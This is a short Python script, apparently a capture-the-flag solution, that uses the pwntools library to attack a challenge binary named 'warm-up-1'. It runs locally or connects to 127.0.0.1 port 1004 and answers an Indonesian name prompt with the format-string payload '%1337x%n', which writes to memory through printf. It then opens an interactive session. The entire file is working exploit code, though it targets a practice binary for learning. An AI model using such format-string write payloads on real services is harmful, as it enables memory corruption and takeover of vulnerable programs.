#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

if len(sys.argv) == 1:
    r = process("./warm-up-1")
else:
    r = remote("127.0.0.1", 1004)

payload = str("%1337x%n")
r.sendlineafter("Nama Kamu Siapa?\n", payload, timeout=3)
r.interactive()
